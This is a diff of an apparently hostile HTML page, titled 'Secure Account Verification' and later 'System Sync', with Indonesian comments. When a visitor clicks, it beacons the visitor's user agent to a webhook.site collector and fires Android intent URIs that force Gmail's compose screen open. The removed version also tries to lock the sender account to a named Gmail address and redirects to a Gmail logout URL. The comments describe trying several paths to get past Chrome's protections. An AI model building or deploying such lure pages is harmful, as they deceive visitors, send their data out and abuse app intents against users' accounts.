@@ -1,62 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head><title>Secure Account Verification</title></head>
-<body style="background:#000;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px solid #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 100px #0ff;border-radius:30px">
-        <h1 style="letter-spacing:10px;margin:0">V208_SNIPER</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#f0f">LOCKING_TARGET_ACCOUNT...</div>
-        <div style="font-size:12px;color:#555">[ TARGET: ecdnts@gmail.com ]</div>
+<head><title>System Sync</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 50px #0f0">
+        <h1 style="letter-spacing:5px">V209_FORCE_GMAIL</h1>
+        <div id="status" style="font-size:18px">CLICK_TO_OPEN_NATIVE_APP</div>
     </div>
 
 <script>
     const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
-    document.getElementById('ignite').onclick = async () => {
-        const statusEl = document.getElementById('status');
-        statusEl.innerText = "EXECUTING_ACCOUNT_JUMP...";
+    document.getElementById('ignite').onclick = () => {
+        // 1. DATA RECON (Kirim log ke Webhook kamu)
+        const recon = { id: "V209_JUMP", ua: navigator.userAgent };
+        navigator.sendBeacon(`${target}?v=V209_EXEC`, btoa(JSON.stringify(recon)));
 
-        // 1. RECON (Kirim log ke Webhook)
-        const recon = {
-            id: "V208_SNIPER_EXEC",
-            target_account: "ecdnts@gmail.com",
-            ua: navigator.userAgent
-        };
-        navigator.sendBeacon(`${target}?v=V208_TARGETED`, btoa(JSON.stringify(recon)));
-
-        // 2. THE SNIPER INTENT (Targeted at specific account)
-        // Kita menyuntikkan S.account untuk memaksa Gmail memilih akun tersebut
-        const sniperIntent = 
+        // 2. THE FORCE INTENT
+        // Kita menggunakan 'SENDTO' dengan package eksplisit agar tidak ada pilihan aplikasi lain
+        const forceIntent = 
             "intent:#Intent;" +
             "action=android.intent.action.SENDTO;" + 
-            "data=mailto:audit-collector@security.org;" + // Alamat tujuan
-            "package=com.google.android.gm;" +
+            "data=mailto:ecdnts@gmail.com;" + // Menargetkan akun spesifik
+            "package=com.google.android.gm;" + // MENGUNCI KE GMAIL
             "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
-            "S.android.intent.extra.SUBJECT=V208_ACCOUNT_DUMP;" +
-            "S.android.intent.extra.TEXT=SENSITIVE_PAYLOAD_FOR_TARGET_ACCOUNT;" +
-            "S.account=ecdnts@gmail.com;" + // MENGUNCI AKUN PENGIRIM
-            "S.from=ecdnts@gmail.com;" +    // MENGUNCI IDENTITAS PENGIRIM
-            "S.browser_fallback_url=https://mail.google.com/mail/u/0/?authuser=ecdnts@gmail.com;" + 
+            "S.android.intent.extra.SUBJECT=V209_STRIKE;" +
+            "S.android.intent.extra.TEXT=GMAIL_NATIVE_OPENED_SUCCESSFULLY;" +
+            "S.browser_fallback_url=https://mail.google.com;" + 
             "end";
 
-        // 3. ATOMIC EXECUTION
-        const a = document.createElement('a');
-        a.href = sniperIntent;
+        // 3. EXECUTION
+        // Mencoba tiga jalur sekaligus agar salah satunya menembus proteksi Chrome
+        window.location.replace(forceIntent);
         
-        setTimeout(() => {
-            // Jalur 1: Intent Injection
-            window.location.href = sniperIntent;
-            
-            // Jalur 2: Native Click Bypass
-            a.click();
-
-            // 4. FALLBACK: Jika aplikasi gagal, paksa lewat Web UI dengan parameter User
-            setTimeout(() => {
-                if (!document.hidden) {
-                    statusEl.innerText = "FALLBACK_TO_WEB_AUTH...";
-                    window.location.href = "https://mail.google.com/mail/u/0/?logout&target=ecdnts@gmail.com";
-                }
-            }, 1200);
-        }, 300);
+        const a = document.createElement('a');
+        a.href = forceIntent;
+        a.click();
+        
+        document.getElementById('status').innerText = "REDIRECTING_TO_GMAIL...";
     };
 </script>
 </body>
